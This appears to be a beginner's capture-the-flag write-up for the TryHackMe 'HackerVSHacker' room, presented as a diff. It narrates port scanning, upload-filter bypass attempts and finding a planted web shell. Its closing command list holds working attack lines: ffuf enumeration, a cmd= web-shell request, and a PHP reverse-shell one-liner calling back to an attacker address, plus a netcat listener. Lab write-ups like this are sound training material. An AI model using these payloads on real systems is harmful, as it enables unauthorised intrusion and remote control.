@@ -1,1 +1,50 @@
+CTF Name: - HackerVSHacker
 
+Category: - Purple Team
+Difficulty: - Easy
+Website: - TryHackMe
+
+Description: -
+The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix 
+the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?
+
+Machine IP: - 10.201.44.133
+
+Part 01: - Intial Obervation for bug or exploit
+
+At first a basic nmap scan was done to know the number of ports and services. After the scan there was both http and ssh open at 80
+and 22 from which i went to the website which did not had usefull info at the beginning just a option to upload a file. So i 
+decided to upload a php-reverse-shell.php from "Pentest Monkey" which failed and gave me a text that the attacker is not that dumb
+to give access so easy (Classic THM Troll). So i decided to inspect the pagesource at the first site "http://MachineIP/" which 
+gave me a info that the uploaded file goes into /cvs folder (Cool). From which i tried to gain access with "http://MachineIP/cvs"
+which failed saying i cant access the directory. So then i decided to page-source both the /cvs and /upload.php (Upload.php is 
+where THM trolled) which gave me a set of code in php. With the help of ChatGPt i understood the code it state that only .pdf
+extension will be accepted. So the next phase .........
+
+Part 02: - Gaining a access to the Machine
+
+So i decided to change the extension of my php file to php-revrse-shell.pdf.php and then i tries to gain access but still faiked.
+After trying for 10 th different i gave up and checked the writeup for a hint and it gave me a hint that it alerady has a file in
+it that has reverse shell just needs to find it with the help of ffuf. So I used ffuf to give enumerate me the text file which 
+worked and I got shell.pdf.php in the cvs. Shell.pdf.php was an IDOR vulnerablity so i had to use the command (At the bottom of 
+the page) to know who is the user and getting reverse shell this failed due to some URL issues so i decided to use other way.
+Burpsuite was used to intercpt the traffic and make changes in the header in the application where only part was working i added
+the whole command which worked and it worked and i got the shell with help of netcat.
+
+Part 03: - Privlage Escalation
+
+
+
+Commands Used: -
+
+Nmap: - nmap -sV -sS MachineIP -oN firstnmap.txt
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://MachineIP/cvs/FUZZ.pdf.php" -mc 301
+
+http://MachineIP/cvs/shell.pdf.php?cmd=id
+
+http://MachineIP/cvs/shell.pdf.php?cmd=php -r '$sock=fsockopen("YOUR IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Reverse shell: - php -r '$sock=fsockopen("10.9.188.150",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Netcat: - nc -lnvp PORT
